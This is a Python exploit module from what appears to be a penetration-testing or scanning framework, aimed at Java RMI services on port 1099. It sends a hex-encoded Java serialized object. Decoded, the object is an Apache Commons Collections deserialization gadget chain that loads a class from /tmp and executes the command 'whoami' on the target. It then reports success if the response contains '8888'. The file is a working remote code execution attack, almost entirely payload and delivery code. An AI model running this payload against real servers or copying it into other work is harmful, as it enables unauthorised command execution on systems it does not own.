# -*- coding:UTF-8 -*-
from lib.util.output import Output
from lib.util.fun import parse_url
import lib.util.globalvar as GlobalVar
import binascii
import socket
import time
"""
+-------------+-----------+------+
| Target type | Vuln Name | Info |
+-------------+-----------+------+
| javarmi     | rmi       | 1099 |
+-------------+-----------+------+
"""
class javarmi():
    def __init__(self, **env):
        """
        基础参数初始化
        """
        self.url = parse_url(env.get('url'))
        # 默认端口
        self.port = 1099
        self.pool = env.get('pool')
        self.vuln = env.get('vuln')
        self.timeout = int(env.get('timeout'))
        
        # 处理非默认端口情况
        if ':' in self.url:
            temp_list = self.url.split(':')
            self.url = temp_list[0]
            self.port = int(temp_list[1])

    def rmi(self):
        appName = 'javarmi'
        pocname = 'rmi'
        method = 'socks'
        first_send = "4a524d4900024b"
        second_send = "000c31302e3131302e32382e313300000000"
        third_send ="50aced00057722000000000000000000000000000000000000000000000000000044154dc9d4e63bdf74000570776e656473" \
                    "7d00000001000f6a6176612e726d692e52656d6f746570787200176a6176612e6c616e672e7265666c6563742e50726f7879" \
                    "e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e" \
                    "646c65723b7078707372003273756e2e7265666c6563742e616e6e6f746174696f6e2e416e6e6f746174696f6e496e766f63" \
                    "6174696f6e48616e646c657255caf50f15cb7ea50200024c000c6d656d62657256616c75657374000f4c6a6176612f757469" \
                    "6c2f4d61703b4c0004747970657400114c6a6176612f6c616e672f436c6173733b707870737200316f72672e617061636865" \
                    "2e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e5472616e73666f726d65644d617061773fe05df15a70030002" \
                    "4c000e6b65795472616e73666f726d657274002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6" \
                    "e732f5472616e73666f726d65723b4c001076616c75655472616e73666f726d657271007e000a707870707372003a6f72672" \
                    "e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666" \
                    "f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6" \
                    "d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b7078707572002d5b4c6f72672e6170616368652e6" \
                    "36f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d8341899020000707870000000067" \
                    "372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616" \
                    "e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e747400124c6a6176612f6c616e672f4" \
                    "f626a6563743b707870767200176a6176612e6e65742e55524c436c6173734c6f61646572000000000000000000000070787" \
                    "07372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b6" \
                    "5725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6" \
                    "563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797" \
                    "065737400125b4c6a6176612f6c616e672f436c6173733b707870757200135b4c6a6176612e6c616e672e4f626a6563743b9" \
                    "0ce589f1073296c02000070787000000001757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a9902000" \
                    "0707870000000017672000f5b4c6a6176612e6e65742e55524c3b5251fd24c51b68cd02000070787074000e676574436f6e7" \
                    "374727563746f727571007e001d000000017671007e001d7371007e00167571007e001b000000017571007e001b000000017" \
                    "571007e001f000000017372000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f646549000" \
                    "4706f72744c0009617574686f7269747971007e00184c000466696c6571007e00184c0004686f737471007e00184c0008707" \
                    "26f746f636f6c71007e00184c000372656671007e0018707870ffffffffffffffff707400052f746d702f740000740004666" \
                    "96c65707874000b6e6577496e7374616e63657571007e001d000000017671007e001b7371007e00167571007e001b00000001" \
                    "74000d4572726f7242617365457865637400096c6f6164436c6173737571007e001d00000001767200106a6176612e6c616e6" \
                    "72e537472696e67a0f0a4387a3bb3420200007078707371007e00167571007e001b00000002740007646f5f6578656375710" \
                    "07e001d000000017100"

        forth_send = "7e00367400096765744d6574686f647571007e001d0000000271007e003671007e00237371007e00167571007e001b00000" \
                    "00270757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b470200007078700000000174000677686f" \
                    "616d69740006696e766f6b657571007e001d00000002767200106a6176612e6c616e672e4f626a656374000000000000000" \
                    "000000070787071007e002f737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f61" \
                    "64466163746f724900097468726573686f6c647078703f4000000000000c7708000000100000000174000576616c7565710" \
                    "07e004878787672001b6a6176612e6c616e672e616e6e6f746174696f6e2e5461726765740000000000000000000000707870"

        first_send = binascii.a2b_hex(first_send)
        second_send = binascii.a2b_hex(second_send)
        third_send = binascii.a2b_hex(third_send)
        forth_send = binascii.a2b_hex(forth_send)
        #输出类
        output = Output(self.url, appName, pocname)
        try:
            if self.vuln == 'False':
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self.timeout)
                s.connect_ex((self.url, self.port))
                s.send(first_send)
                s.recv(1024)
                time.sleep(0.5)
                s.send(second_send)
                s.send(third_send)
                s.send(forth_send)
                data = s.recv(20480)
                time.sleep(0.5)
                if "8888" in data:
                    return output.no_echo_success(method)
                else:
                    return output.fail()
            else:
                pass
        except Exception as error:
            return output.error_output(self.url+' '+str(error))
        finally:
            s.close()

def check(**kwargs):
    thread_list = []
    Expjavarmi = javarmi(**kwargs)
    # 调用单个函数
    if kwargs['pocname'] != 'ALL':
        thread_list.append(kwargs['pool'].submit(getattr(Expjavarmi, kwargs['pocname'])))
    # 调用所有函数
    else:
        for func in dir(javarmi):
            if not func.startswith("__"):
                thread_list.append(kwargs['pool'].submit(getattr(Expjavarmi, func)))
    # 保存全局子线程列表
    GlobalVar.add_value('thread_list', thread_list)